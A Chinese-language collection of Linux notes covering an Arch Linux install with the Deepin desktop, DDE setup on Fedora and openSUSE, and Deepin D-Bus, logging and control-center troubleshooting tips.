Arch Linux 是一个独立开发的 x86-64 通用 GNU/Linux 发行版，其用途广泛，足以适应任何角色。开发侧重于简单、极简主义和代码优雅。Arch 是作为一个最小的基础系统安装的，由用户配置，通过仅安装其独特目的所需或所需的东西来组装他们自己的理想环境。官方没有提供 GUI 配置实用程序，大多数系统配置是通过编辑简单的文本文件从 shell 执行的。Arch 努力保持领先，通常提供大多数软件的最新稳定版本。Arch Linux 使用自己的 Pacman 包管理器，它将简单的二进制包与易于使用的包构建系统结合在一起。这允许用户轻松管理和自定义包，从官方 Arch 软件到用户自己的个人包，再到来自 3rd 方来源的包。存储库系统还允许用户轻松构建和维护自己的自定义构建脚本、包和存储库，从而鼓励社区发展和贡献。最小的 Arch 基础包集位于精简的 [core] 存储库中。此外，官方的 [extra]、[community]、[testing] 仓库提供了数千个高质量的包来满足您的软件需求。Arch 还提供 Arch Linux 用户存储库 (AUR)，其中包含超过 49,000 个构建脚本，用于使用 Arch Linux makepkg 应用程序从源代码编译可安装包。Arch Linux 使用“滚动发布”系统，允许一次性安装和永久软件升级。通常不需要将 Arch Linux 系统从一个“版本”重新安装或升级到下一个“版本”。通过发出一个命令，Arch 系统就可以保持最新状态并处于最前沿。Arch 努力使其软件包尽可能接近原始上游软件。补丁仅在必要时应用，以确保应用程序与安装在最新 Arch 系统上的其他软件包一起正确编译和运行。Arch Linux 是一个多功能且简单的发行版，旨在满足有能力的 Linux® 用户的需求。它功能强大且易于管理，使其成为服务器和工作站的理想发行版。把它带到你喜欢的任何方向。

官网镜像下载地址 https://archlinux.org/releng/releases/

注意事项 - 安装 ArchLinux 需要联网; - mount 挂载是将 硬盘里分区 挂载到 live 环境 - chroot 是在 live 环境 和 安装到磁盘的系统 之间切换 - 设置了分区表之后, 还需要格式化 - 没有网络,需要安装 NetworkManager 和 执行 dhcpcd(实体机需要） - 磁盘的分区表有两种方式 uefi + gpt + efi 或 legacy + mbr - 安装启动器有：grub(bios 启动) 或 grub + efibootmgr(EFI 启动)

安装思路梳理 1. 清空一个 磁盘 2. 对 磁盘 设置 分区表 3. 对 子分区 选择适合的 TYPE； 4. 选用各自的 文件类型 格式化 子分区 ； 5. 下载 archLinu_xxxxx.iso 镜像 6. 设置第一启动项 7. 开机自动进入 live 环境 8. 将 磁盘 挂载 9. 换源 10. 安装 基本包（含内核等） 11. 配置 fstab 后，chroot 切换操作权 12. 安装 必须软件包 ，设置 Locale 13. 设置 root 密码，和新建一个用户 14. 安装引导 grub 15. 退出和重启系统 16. 开启 NetworkManager 服务自动联网 17. 安装桌面环境 DDE 19. 详细的个性化配置 20. 享受 ArchLinux 的快乐

1.在VMware里面新建系统: - 选择自定义(高级)，因为 VM 对 ArchLinux 没有直接支持； 选择 Linux(L) 时候选择选用 Linux 5.x 的内核版本 - 挂载 iso 镜像 - 设置为 EFI 方式启动

2. 更新系统时区 timedatectl set-ntp true

3. 磁盘分区 输入以下命令： cfdisk # 选择底部 gpt ，回车 # 选择 NEW ，回车，输入 1G，类型选择 EFI SYstem 格式 # 选择 NEW ，回车，输入 4G，类型选择 Linux swap 格式 # 选择 NEW ，回车，剩下的 35G，类型选择 默认 Linux filesystem 格式 # 选择 Write ， 输入 yes，回车 表示写入保存 # 选择 Quit ，退出 EFI分区格式化 mkfs.fat -F32 /dev/sda1 mkfs.ext4 /dev/sda3 创建swap分区： mkswap /dev/sda2 swapon /dev/sda2 挂载分区： mount /dev/sda3 /mnt mkdir -p /mnt/boot/efi mount /dev/sda1 /mnt/boot/efi 查看磁盘分区情况 lsblk -f

4.更新为国内镜像源 reflector --country China --age 72 --sort rate --protocol https --save /etc/pacman.d/mirrorlist 将最新的镜像源更新为国内的，保存在/etc/pacman.d/mirrorlist目录下 也可以手动替换到“/etc/pacman.d/mirrorlistg”中 Server = https://mirrors.bfsu.edu.cn/archlinux/$repo/os/$arch

5.安装 Arch Linux 安装普通内核的命令：pacstrap /mnt base linux linux-headers linux-firmware base-devel

6.写入分区表： genfstab -U /mnt >> /mnt/etc/fstab

7.进入新系统 arch-chroot /mnt

8.安装DDE深度桌面环境 1. 安装编辑器、字体、网络管理 pacman -S vim sudo vim ttf-dejavu networkmanager 2. 安装DDE基础和额外组件 pacman -S lightdm xorg-server deepin-kwin deepin deepin-extra

9.设置时区时间和语言 ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime hwclock --systohc locale-gen echo LANG=en_US.UTF-8 >> /etc/locale.conf

10.设置root用户密码 输入“passwd”，再输入密码，密码不会显示

11.创建新用户 执行如下命令：useradd -m -G wheel -s /bin/bash free 设置密码：passwd free 提权，修改 /etc/sudoers文件，删除wheel组前面的注释（#）即可

12.安装grub EFI 启动方式, 需安装 grub 和 efibootmgr pacman -S grub efibootmgr 然后，还需要将其安装到EFI分区当中： grub-install --recheck /dev/ 生成一个grub的配置文件 grub-mkconfig -o /boot/grub/grub.cfg

13.重启系统 exit umount -R /mnt reboot

14.启动服务 systemctl enable --now NetworkManager systemctl enable --now lightdm

创建用户时需特别注意：
执行如下命令，很坑的的一点，如果安装深度环境 DDE 的话，必须要新建用户
`useradd -m -G wheel -s /bin/bash free`
-m：创建用户主目录
-G：将用户加到wheel组中
-s：指定默认登录shell路径

启动DDE服务：
`systemctl enable --now lightdm`
这将启动lightdm显示管理器，提供图形登录界面

标题：如何在Fedora发行版上安装DDE桌面环境
深度桌面环境（DDE）被认为是深度Linux开发者创造的最优秀的美观桌面环境之一。它也经常被认为是Linux上最漂亮的桌面。对于Fedora的用户来说，这可以很容易地安装并且对于那些喜欢在桌面之间跳跃的人来说是一个可选的选择。

首先，确保您的系统是最新的，因为在使用以下命令安装辅助桌面环境时这是必不可少的。在Fedora桌面环境中，打开终端输入：sudo dnf upgrade --refresh -y

深度桌面环境包含在Fedora 36的存储库中，使得安装相对简单。要开始安装，打开终端输入：sudo dnf group install "Deepin Desktop" -y 安装可能需要几分钟时间，具体取决于硬件的使用年限，尤其是您的互联网连接。总体而言，下载量大约在450MB左右，之后所需的磁盘空间大小约为1.5GB。安装完成后，您需要重新启动PC。这可以在您的终端中使用reboot命令快速完成。

重新启动桌面后，您将进入登录屏幕。首先，您需要通过单击屏幕右上角的设置图标来更改和验证桌面环境，然后选择Deepin。

为深度桌面环境和任何默认DNF包运行标准DNF更新命令以进行更新。在终端中输入：sudo dnf update 当更新可用时，像使用任何其他DNF包一样运行标准升级命令。在终端中输入：sudo dnf upgrade --refresh -y

删除Deepin桌面环境的用户，请使用以下终端命令: sudo dnf group remove "Deepin Desktop" 完成后，重新启动系统。

在终端中输入：yum list installed查看所有包环境信息

可在路径~/.cache/deepin下查看日志信息

标题：如何在openSUSE发行版上安装DDE桌面环境
DDE桌面环境在openSUSE leap 15.3及以上版本是有较好适配的。警告！Deepin Desktop 有一些安全问题，请不要在重要的地方部署 Deepin Desktop 。

openSUSE镜像下载地址：https://download.opensuse.org/distribution/leap/15.3/iso/openSUSE-Leap-15.3-3-DVD-x86_64-Build38.1-Media.iso。安装镜像时，可先选择GNOME桌面版系统（建议不要安装KDE桌面版系统，防止与DDE桌面环境冲突）。

Deepin Desktop 已经被 openSUSE 官方所支持，你可以先在 Leap 上配置好仓库。终端中使用命令：sudo zypper ar -f https://download.opensuse.org/repositories/X11:/Deepin/openSUSE_Leap_15.3/X11:Deepin.repo。openSUSE Tumbleweed 的用户可以使用下述命令，注意，新的 DDE 移植尚未完成，不适合普通用户使用：sudo zypper ar -f https://download.opensuse.org/repositories/X11:/Deepin:/Factory/openSUSE_Tumbleweed/X11:Deepin:Factory.repo。

安装DDE桌面环境，终端中使用命令：sudo zypper in -t pattern deepin。安装完成后，重启，进入登录界面，点击设置按钮，选择deepin桌面环境。默认的显示管理器是SDDM ，你可以在菜单中选择 "Deepin" 来登录Deepin桌面。此外，你也可以使用其他显示管理器。lightdm是上游的默认显示管理器，但它不能在Leap 15.3和更高版本上启动Deepin Desktop。SDDM和GDM在 Deepin Desktop上则可以正常启动Deepin桌面。

为了确保你的 openSUSE 处于安全状态，我们默认禁用了 deepin-api 和 deepin-daemon 的所有 dbus 和 policykit 特性，以及 deepin-file-manager。这导致 Deepin Desktop 不能完整地正常工作，一些功能会失效：deepin-lock 上的壁纸是无效的；初始屏幕上的壁纸是无效的；lightdm-deepin-greeter 是无效的；deepin-lock无法启动，无法通过gui关机重启；无法通过控制中心管理用户和网络。如果你想启用 Dbus 和 Policykit ，并且不关心安全问题，你可以用 root 权限手动运行 deepin-daemon-dbus-installer 和 deepin-daemon-polkit-installer或安装deepin-feature-enable来启用这些功能。具体终端命令参考如下：sudo deepin-daemon-dbus-installer；sudo deepin-daemon-polkit-installer；sudo zypper in deepin-feature-enable。

标题：如何抓取蓝牙（HCI）协议日志
安装抓取蓝牙HCI日志工具的命令为：sudo apt-get install bluez-hcidump。

设置bluetoothd为debug需打开/etc/systemd/system/bluetooth.target.wants/bluetooth.server，在ExecStart行（如ExecStart=/usr/lib/bluetooth/bluetoothd）加上-d，之后执行systemctl restart bluetooth.service重启服务。

运行工具抓取日志的命令包括：sudo hcidump -w /tmp/sony1.log 和 sudo journalctl -f /usr/lib/bluetooth/bluetoothd > /tmp/sony.txt。

若使用蓝牙过程中出现异常，需要抓取日志提交开发人员分析。安装抓取蓝牙HCI日志工具：sudo apt-get install bluez-hcidump

标题：屏保相关操作及命令
屏幕保护是为了保护显示器而设计的一种专门的程序。

通过Dbus com.deepin.ScreenSaver服务的下的属性currentScreenSaver保存了当前屏保的名字。执行命令：qdbus com.deepin.ScreenSaver /com/deepin/ScreenSaver com.deepin.ScreenSaver.currentScreenSaver 若出现报错，可在终端中下载qdbus，使用命令sudo apt install qdbus。

通过Dbus com.deepin.ScreenSaver服务的下的属性 allScreenSaver 这个链表中保存了屏保名。使用 GetScreenSaverCover (String name) 方法，传入屏保名，可获取屏保路径。DBus服务：服务名：com.deepin.ScreenSaver 地址：/com/deepin/ScreenSaver 接口：com.deepin.ScreenSaver DBus方法：GetScreenSaverCover (String name) ↦ (String imagePath) 参数：@name 为屏保名字，如“flurry” 命令行：dbus-send --session --type=method_call --print-reply --dest=com.deepin.ScreenSaver /com/deepin/ScreenSaver com.deepin.ScreenSaver.GetScreenSaverCover string:'@name'

通过Dbus org.freedesktop.DBus服务下的ListActivatableNames方法可以获得当前可用的服务列表 当服务列表中不存在屏保服务com.deepin.ScreenSave时 需要屏蔽屏保功能显示。注意是Session Bus下的org.freedesktop.DBus服务。DBus服务：服务名：org.freedesktop.DBus 地址：/org/freedesktop/DBus 接口：org.freedesktop.DBus DBus方法：ListActivatableNames () ↦ (Array of [String] arg_0) 命令行：dbus-send --session --type=method_call --print-reply --dest=org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus.ListActivatableNames

桌面提供三种方式禁用屏保：环境变量，卸载屏保，gsetting配置。三种方式中任意一种设置为禁用屏保就会使得屏保被禁用。1. 环境变量配置：在系统环境变量中添加下述值即可禁用屏保：DESKTOP_CAN_SCREENSAVER=N 2. 卸载屏保：sudo apt remove deepin-screensaver 3. 通过gsetting配置：使用gsettings设置show-screen-saver的值为false则禁用屏保，为true则为不禁用，命令：gsettings set com.deepin.dde.filemanager.desktop show-screen-saver false

标题：快捷键无效、触发慢
请先使用 evtest 命令检测是否能获取该按键事件。运行 sudo evtest 然后按序号选择键盘（例如下面的键盘序号是3），planc0515@uos:~$ sudo evtest。Available devices:/dev/input/event0:      Sleep Button/dev/input/event1:      Power Button/dev/input/event2:      Power Button/dev/input/event3:      SIGMACHIP USB Keyboard/dev/input/event4:      SIGMACHIP USB Keyboard Consumer Control/dev/input/event5:      SIGMACHIP USB Keyboard System Control/dev/input/event6:      PixA琀 USB Optical Mouse/dev/input/event7:      PC Speaker/dev/input/event8:      HDA ATI HDMI HDMI/DP,pcm=3/dev/input/event9:      HDA Intel PCH Rear Mic/dev/input/event10:     HDA Intel PCH Front Mic/dev/input/event11:     HDA Intel PCH Line/dev/input/event12:     HDA Intel PCH Line Out/dev/input/event13:     HDA Intel PCH Front Headphone/dev/input/event14:     87:48:54:15:83:35Select the device event number [0-14]:然后按对应的快捷键，观察是否有正确的事件产生，例如下面这个输出中code 29 (KEY_LEFTCTRL)表示按键是 [左CTRL]value 1表示按下，value 0表示松开Event: time 1597816145.422913, type 4 (EV_MSC), code 4 (MSC_SCAN), value 700e0Event: time 1597816145.422913, type 1 (EV_KEY), code 29 (KEY_LEFTCTRL), value 1Event: time 1597816145.422913, -------------- SYN_REPORT ------------Event: time 1597816145.542865, type 4 (EV_MSC), code 4 (MSC_SCAN), value 700e0Event: time 1597816145.542865, type 1 (EV_KEY), code 29 (KEY_LEFTCTRL), value 0Event: time 1597816145.542865, -------------- SYN_REPORT ------------

标题：控制中心常见问题分析
控制中心显示模块中某几个分辨率设置不成功，或者设置后花屏，闪屏。控制中心分辨率的设置功能分为几个部分，前端部分是UI，提供给用户一个良好的操作界面，后端实现部分，真正执行该功能的部分。碰到显示模块设置不成功的或者设置后出现花屏，闪屏等问题，可以抛开控制中心快速进行问题的定位和分析。根据Xrandr里面的wiki,首先执行xrandr命令，查看当前所连接的屏幕通用信息。执行设置分辨率的命令： xrandr --output eDP1 --mode 1920x1080 （注： eDP1 是 根据xrandr命令出来的，有可能是HDMI等等）。如果执行命令依然不成功或者花屏，闪屏，那么与控制中心无关，如果可以成功，那么需要控制中心排查一下传入参数是否正确。

GLib-GIO-ERROR : Settings 提示找不到某一个键名。这里以我实际开发碰到的问题为例子：当打开控制中心以后，点击账户模块，提示如下错误：GLib-GIO-ERROR **: 16:11:19.644: Settings schema 'com.deepin.dde.control-center' does not contain a key named 'auto-login-visable'追踪与中断点陷阱 (核心已转储)。问题原因： 对应的 com.deepin.dde.control-center.gschema.xml 文件找不到 'auto-login-visable' 这个节点信息。分析过程： 控制中心程序可以启动，但是当点击“账户”模块时，控制中心就崩溃掉了。 可以在控制台下执行 dde-control-center -s ， 等界面出来后，点击“账户”模块，然后控制中心程序退出，控制台可以看到标题内容错误。解决办法： 这个错误通常会出现在新功能开发阶段，不像dde-dock ，控制中心的 com.deepin.dde.control-center.gschema.xml 并非自己的工程进行管理，它是另外一个项目——deepin-desktop-schemas 它来管理的。这个时候我们需要下载 deepin-desktop-schemas 工程并切换到对应的分支，然后将对应的xml文件拷贝到 /usr/share/glib-2.0/schemas 目录下（有则覆盖）。

控制中心一直闪退。问题原因:闪退的原因有很多,这里之举例启动的一种情况,也是大家很容易遇到的情况,dde-qt-dbus-factory的版本没有和dde-control-conter的版本同步升级,这个特别容易出现在exp版本,有些之更新了 dde-control-conter其他的控制中心依赖的没有更新导致的。分析过程:可以在命令行中打开控制中心即在终端输入: dde-control-conter -s 看下报错误的位置比如xxx::datetime xxxx::battery 等等。解决办法:更新dde-qt-dbus-factory和dde-control-conter到最新的版本。

声音模块没有输入输出设备及无法选中设备。问题原因:1.没有输入输出硬件设备，2.没有接入对应的输入输出设备。分析过程:1.使用命令“arecord -l”查看音频输入设备，使用命令“aplay -l”查看音频输出设备，查看有无输入输出硬件设备。2.安装并打开D-Feet，选择Session Bus。在左侧搜索com.deepin.daemon.Audio，在右侧依次展开/com/deepin/daemon/Audio->Interfaces->com.deepin.daemon.Audio->Properties。双击Cards查看所有输入输出端口，属性Direction=1表示输出端口，Direction=2表示输入端口。双击DefaultSink查看选中端口所属输出设备，双击DefaultSource查看选中端口所属输入设备。双击Sinks查看输出设备列表，双击Sources查看输入设备列表。设定DefaultSink为/com/deepin/daemon/Audio/Sink0，依次展开/com/deepin/daemon/Audio/Sink0->Interfaces->com.deepin.daemon.Audio.Sink->Properties，双击ActivePort查看选中端口，双击Card查看端口CardID。设定DefaultSource为/com/deepin/daemon/Audio/Source0，依次展开/com/deepin/daemon/Audio/Source0->Interfaces->com.deepin.daemon.Audio.Source->Properties，双击ActivePort查看选中端口，双击Card查看端口CardID。

控制中心-账户无指纹相关信息。问题原因: 1.未接入指纹设备，2.已接入指纹设备，但系统未识别，3.指纹设备硬件已损坏。分析过程：1.首先需要了解系统版本系统是否支持指纹识别。支持指纹设备后，可进一步排查问题出现原因。2.当未接入指纹设备时，“控制中心-账户”中不会有指纹相关信息及“添加指纹”按钮，需先接入指纹设备。3.接入设备后若还是没有指纹相关信息，打开D-Feet工具，左侧搜索系统服务“com.deepin.daemon.Authenticate”，进入“/com/deepin/daemon/Authenticate/Fingerprint”路径下“com.deepin.daemon.Authenticate.Fingerprint”接口中，查看“Devices”属性是否有值，若为空，则表示系统为识别出来，需要先重启电脑后再查看。4.重启后若还是没有指纹信息，此时可更换usb端口后重新查看。5.若更换端口后D-Feet中还是无法查看到指纹设备信息，此时无法判定是否指纹设备硬件是否已损坏。6.更换电脑，多试几次，若还是找不到指纹账户信息。则可以判定指纹设备已损坏。

选中打开文件的默认程序。问题原因:没有选中的默认程序，默认程序勾选错误。分析过程:安装并打开D-Feet，选择Session Bus。在左侧搜索com.deepin.daemon.Mime，在右侧依次展开/com/deepin/daemon/Mime->Interfaces->com.deepin.daemon.Mime->Methods。网页类型："x-scheme-handler/http"，"x-scheme-handler/ftp"，"x-scheme-handler/https"，"text/html"，"text/xml"，"text/xhtml_xml"，"text/xhtml+xml"。邮件类型："x-scheme-handler/mailto"，"message/rfc822"，"application/x-extension-eml"，"application/x-xpinstall"。文本类型："text/plain"。音乐类型："audio/mpeg"，"audio/mp3"，"audio/x-mp3"，"audio/mpeg3"，"audio/x-mpeg-3"，"audio/x-mpeg"，"audio/flac"，"audio/x-flac"，"application/x-flac"，"audio/ape"，"audio/x-ape"，"application/x-ape"，"audio/ogg"，"audio/x-ogg"，"audio/musepack"，"application/musepack"，"audio/x-musepack"，"application/x-musepack"，"audio/mpc"，"audio/x-mpc"，"audio/vorbis"，"audio/x-vorbis"，"audio/x-wav"，"audio/x-ms-wma"。视频类型："video/mp4"，"audio/mp4"，"audio/x-matroska"，"video/x-matroska"，"application/x-matroska"，"video/avi"，"video/msvideo"，"video/x-msvideo"，"video/ogg"，"application/ogg"，"application/x-ogg"，"video/3gpp"，"video/3gpp2"，"video/flv"，"video/x-flv"，"video/x-flic"，"video/mpeg"，"video/x-mpeg"，"video/x-ogm"，"application/x-shockwave-flash"，"video/x-theora"，"video/quicktime"，"video/x-ms-asf"，"application/vnd.rn-realmedia"，"video/x-ms-wmv"。图片类型："image/jpeg"，"image/pjpeg"，"image/bmp"，"image/x-bmp"，"image/png"，"image/x-png"，"image/tiff"，"image/svg+xml"，"image/x-xbitmap"，"image/gif"，"image/x-xpixmap"，"image/vnd.microsoft.icon"。终端类型："application/x-terminal"。双击GetDefaultApp，弹出运行D-Bus方法，在方法输入框中输入音乐类型的任意一种比如"audio/mpeg"，点击运行，方法输出框中展示错误信息或者输出当前类型的默认程序。类似操作执行ListApps查看对应类型所有应用程序，执行ListUserApps查看用户自定义添加的应用程序。解决办法:查看对应类型的默认程序

查看帐户是否在线。问题原因:不能移除在线帐户。分析过程:安装并打开D-Feet，选择System Bus。在左侧搜索com.deepin.daemon.Accounts，在右侧依次展开/com/deepin/daemon/Accounts->Interfaces->com.deepin.daemon.Accounts->Properties。双击UserList查看所有帐户，设定帐户为/com/deepin/daemon/Accounts/User1000，依次展开/com/deepin/daemon/Accounts/User1000->Interfaces->com.deepin.daemon.Accounts.User->Properties，双击UserName查看帐户名称，类似查看其它信息。在左侧搜索org.freedesktop.DisplayManager，再右侧依次展开/org/freedesktop/DisplayManager->Interfaces->org.freedesktop.DisplayManager->Properties。双击Sessions查看所有在线会话，设定在线会话为/org/freedesktop/DisplayManager/Session1，依次展开/org/freedesktop/DisplayManager/Session1->Interfaces->org.freedesktop.DisplayManager.Session->Properties，双击UserName查看在线会话对应的帐户名称。解决办法:查看所有帐户及在线帐户

控制中心无法启动、某个模块进入就闪退。问题原因：dbus接口版本与控制中心版本不匹配+gesetting配置文件版本不匹配+代码逻辑问题（空指针、除零）。前两个为项目项目特性强关联的常见崩溃原因。分析过程：dbus版本问题--命令启动控制中心，查看输出报错信息，有类似symbol error，undefine symbol的字样，还会有一个运行函数名（和源码函数名有一定差异，熟悉接口大概可以看出对应代码函数名），这种状况根据控制中心版本去crp下载对应较新的dde-qt-dbus-factory版本安装可解。gsetting版本问题--命令启动控制中心，查看输出报错信息，有GLib-GIO-ERROR，Settings schema字样的报错，信息里描述了缺少哪个schema或者哪个字段，同样根据控制中心版本去crp下载对应较新deepin-desktop-schemas版本安装。另外也可以到gerrit下载代码上库编译出的包或者自己更新代码编译一个版本，这两种方法也适合第一类问题。代码逻辑导致崩溃--启动或进入就崩溃的代码逻辑问题，直接到对应模块的preInitialize(bool sync)、initialize()、active()、load(const QString &path)查看，崩溃就出在这几个函数中，可以加快定位崩溃代码点。控制中心命令启动：启动控制中心主界面 dde-control-center -s 启动指定模块 dde-control-center -m moduleName 启动指定模块页面 dde-control-center -m moduleName -p pageName模块名列表："accounts" "cloudsync" "display" "defapp" "personalization" "network" "notification" "sound" "bluetooth" "datetime" "power" "mouse" "wacom" "keyboard" "update" "systeminfo" "commoninfo"页面名繁多，不一一列举。

各部件窗口滚动条位置问题。问题原因1：按住鼠标左键拖动滚动条，结果窗口部件移动方向与鼠标方向相反;分析过程：鼠标左键按下拖动，属于就是一个手指在屏幕上沿着一个固定的方向滑动，滑动一段距离时就产生了一个事件，这时需要调用QWidget::grabGesture方法来截获相应的手势类型。此时可以查看这个函数的声明，有2个重载函数：static Qt::GestureType grabGesture(QObject *target, ScrollerGestureType gestureType = TouchGesture);static Qt::GestureType grabbedGesture(QObject *target);第一个函数声明不仅定义了滑动手势目标对象还定义了滑动姿势。现在基本可以确定是滑动目标对象有问题导致QScroller::LeftMouseButtonGesture这个滑动姿势出现的现象不是期望的。问题原因2：各窗口部件的滚动条遮挡listview控件内容;分析过程：DTK提供的滚动条控件，但是他们只保证滚动条离滚动区域2像素，我们自己需要手动去添加，移动滚动条的位置通常在listview，即滚动条要滚动的区域加setContentsMargins(0, 0, 0, 0); setViewportMargins(12, 0, 12, 0);这个12像素可根据情况自行调整。为什么要调这个可参考https://blog.csdn.net/hyongilfmmm/article/details/83014405很详细的讲解了Qt滚动区域原理(QAbstractScrollArea)。

自定义模式下点击旋转屏幕未保存，屏幕由拆分变成合并。问题原因是执行DisplayWorker的setMonitorRotate会导致monitor参数变化， worker会发信号通知model数据变了，这个过程是一个异步，CustomSettingDialog重新应用屏幕位置时， 有可能出现model数据没有获取对CustomSettingDialog判断屏幕的宽高不一致，就给设定为了拆分模式，在setMonitorRotate加一个m_model->isMerge() == false判断就好了。

标题：控制中心更新失败、连接VPN失败，如何查看详细错误日志
控制中心更新失败,查看log
终端输入命令: cat ~/.cache/deepin/dde-control-center/dde-control-center.log
搜索UpdateFailed关键字, 就能看到具体升级失败的原因。
特别说明：可能在控制中心会存在多个错误信息, 最好是先删除上面的日志, 再重启控制中心(必须要重启,才能生成新的dde-control-center.log), 这样就能保证只有一个UpdateFailed; 假如不想删除dde-control-center.log, 则可以根据时间去查看UpdateFailed出现的信息。

连接VPN失败
终端输入命令: sudo journalctl -b -f -u NetworkManage

标题：插入鼠标后触控板被禁用
输入密码进入桌面后，触摸板不能使用了；可以通过 xinput enable "MSFT0001:01 06CB:CE2D Touchpad" 打开。插入鼠标后，触摸板又被禁用了；此时没有选择控制中心的“插入鼠标禁用触摸板”。

调查将/usr/lib/deepin-daemon/dde-session-daemon 杀掉后就没有问题了，可以确定是dde-daemon的问题。查看gsetting值：gsettings get com.deepin.dde.touchpad touchpad-enabled，发现返回值是false。通过修改 gsettings set com.deepin.dde.touchpad touchpad-enabled true，就不存在这个问题了。

该设置在某些情况下被用户设置成了false，但是控制中心却没有隐藏 鼠标 -> 鼠标 ->“插入鼠标时禁用触摸板”给用户造成了误解。因此后面会将该设置项目与这个gsetting值绑定，该值为false的时候就不显示。

标题：桌面常见问题及解决方法
如何查看系统的基本操作（深度帮助手册系列） 方法一：在桌面、控制中心、启动器、或者各个应用按 <kbd>F1</kbd> 快捷键（也可以单击主菜单中的帮助），打开帮助手册，查看系统的基本操作。 方法二：在终端执行命令 `dman /usr/share/dman/dde/zh_CN/` 查看系统的基本操作。

如何了解deepin相关的命令操作？ deepin系统相关命令操作请参考： http://list.youku.com/albumlist/show/id_51250083

如何使用命令行安装应用和依赖，更新升级和卸载应用？ 相关命令如下： `sudo apt install packagename` `sudo apt install -f` `sudo apt update` `sudo apt dist-upgrade` `sudo apt remove packagename`

如何查看系统默认的壁纸存放路径？ 进入系统默认的壁纸存放路径 “/usr/share/wallpapers/deepin” 即可查看壁纸。 `cd /usr/share/wallpapers/deepin`

深度截图录屏如何设置超过10s的延时截图？ （1）按下快捷键 <kbd>Ctrl</kbd> + <kbd>Alt</kbd> + <kbd>T</kbd> （2）打开终端，执行命令 `deepin-screen-recorder -d 10`

亮度无法调节 进入 “控制中心 > 显示 > 亮度”， 关闭 自动调节色温。 （1）按下快捷键 <kbd>Ctrl</kbd> + <kbd>Alt</kbd> + <kbd>T</kbd> （2）打开终端，执行命令 `xrandr --output eDP --brightness 0.5` `--ouput` 后面为你的显示器 ,输入 xrandr 可以看到 `--brightness` 后面为你要调的亮度 [0,1]

窗口默认居中如何设置 只需要修改 ~/.config/kwinrc 文件，在里面加上这一行： [Windows] Placement=Centered

如何使用系统命令？ https://github.com/jaywcjlove/linux-command

使用截图录屏功能的时候不能录制视频，无录屏功能 请确认是否开启窗口高效模式，没开高效模式是无法录制，只能截图; 如果是集成显卡，没有窗口特效开关，无法打开窗口特效开关，便不能录屏。

系统密码登录桌面自动闪退 <kbd>Ctrl</kbd> + <kbd>Alt</kbd> + <kbd>F2</kbd> 进入终端，安装 `apt install startdde=5.2.1-1`； `sudo service lightdm restart`

在使用过程中桌面鼠标卡死 1. 为图形界面卡死，内核未卡死； 2. 进入tty模式后，top查看系列性能，发现swap分区已被全部使用，发现browser360进程占用内存为77.8%； 3. 在kill browser360后，图形界面任然存在卡顿情况； 4. Kill tty1以重启dde-desktop命令，重启完成后图形界面回复正常。

v20如何关闭电脑的屏幕的触摸功能 打开终端输入 `xinput --list` 看list中pointer前面的名字，使用命令 `xinput disable [id]`  来禁用对应的设备

安装软件应用后，桌面不显示图标 打开路径 计算机/date/opt/apps/软件名称 找到该应用图标，右健发送到桌面

添加新的字体到deepin系统里 查看系统自带字体  `cat /etc/issuefc-lista`  例子：目前系统中没有微软雅黑字体。我们现在需要把（微软雅黑.TTF）文件安装到deepin终端。如下： 打开微软雅黑字体所在文件夹右击打开终端把 微软雅黑.TTF 复制到 /usr/share/fonts/fonts-cesi 目录下，使用如下命令： `cp 微软雅黑.TTF /usr/share/fonts/fonts-cesi`  然后建立字体索引信息，更新字体缓存，使用如下命令： `cd /usr/share/fonts/fonts-cesi` `chmod a+r 微软雅黑.TTF` `mkfontscale` `mkfontdir` `fc-cachefonts-cesi`

密码锁定次数配置文件 `cat var/lib/deepin/authenticate/config.json` 里面的 maxtries 属性值

清除已卸载软件遗留配置 `dpkg --get-selections | grep deinstall | sed 's/deinstall/\lpurge/' | sudo dpkg --set-selections; sudo dpkg -Pa`

输入法消失，右下角输入法图标消失 点击start 打开“输入法配置” 右下角图标就可恢复

右下角网络图标如何关闭 执行 `systemctl stop network-manager`

Dock使用屏幕缩放后隐藏功能异常 https://bbs.deepin.org/post/196967

如何安装windows字体 从win10里拷贝出来，然后deepin下用字体安装器就可以了

标题：浅谈DDE桌面运行机制
桌面环境是一些组件的组合体，为你提供图形用户界面，通俗点讲，就是在内核和显示服务器上，写一批程序让用户登录后就可以像在 Windows 中一样使用鼠标和键盘来使用 Linux系统。如果没有桌面环境，你就只能用命令与你的 Linux 系统进行交互。桌面环境决定了你的 Linux 系统的样子以及你与它的交互方式。常见桌面环境有：DDE，KDE，GNOME，Xfce、Unity、Cinnamon、MATE、Lxde等。

固定区域，托盘区域和插件区域的代码都在dock项目里，功能由dock直接维护。应用程序的加载主要依赖后台服务: com.deepin.daemon.Dock，其中右键菜单，打开，激活等功能都是调用后台服务接口实现。打开d-feet，在Session Bus中搜索daemon.dock。

以启动“控制中心”为例，我们先来看看有几种方法：1. 在任务栏左键点击或右键打开；2. 桌面打开终端后，在终端中输入命令：dde-control-center -s；3. 桌面打开终端后，在终端中输入命令：dbus-send --session --type=method_call --print-reply --dest=com.deepin.dde.ControlCenter /com/deepin/dde/ControlCenter com.deepin.dde.ControlCenter.Show；4. 打开d-feet，搜索ControlCenter，打开com.deepin.dde.ControlCenter。

启动器软件列表的加载主要依赖后台服务: com.deepin.daemon.Launcher。所有安装的软件都会有一个.desktop文件，记录了软件基本的信息，该文件在安装后会放在目录/usr/share/applications下，后台服务通过扫描该目录下所有的.desktop文件，来提供安装软件列表给启动器展示。通过pstree查看，可发现所有由Launcher启动的程序，父进程都是startdde，可以得知道启动器都是由startdde调用接口启动软件的。任务栏点击启动器，launcher的父进程总是为systemd，并不是startdde？因为在代码中，启动launcher的方式就是直接通过launcher注册的dbus服务，调用show函数，类似与dbus-send的方式。

Lightdm: /var/log/lightdm/lightdm.log；lightdm-deepin-greeter: /var/log/lightdm/seat0-greeter.log；startdde: journalctl –b /usr/bin/startdde；dde-session-daemon: journalctl –b /usr/bin/dde-session-daemon；dde-dock: ~/.cache/deepin/dde-dock/dde-dock.log；dde-control-center: ~/.cache/deepin/dde-control-center/dde-control-center.log；dde-launcher: ~/.cache/deepin/dde-launcher/dde-launcher.log；dde-lock: ~/.cache/deepin/dde-lock/dde-lock.log；dde-shutdown: ~/.cache/deepin/dde-shutdown/dde-shutdown.log；dde-kwin:~/.kwin.log

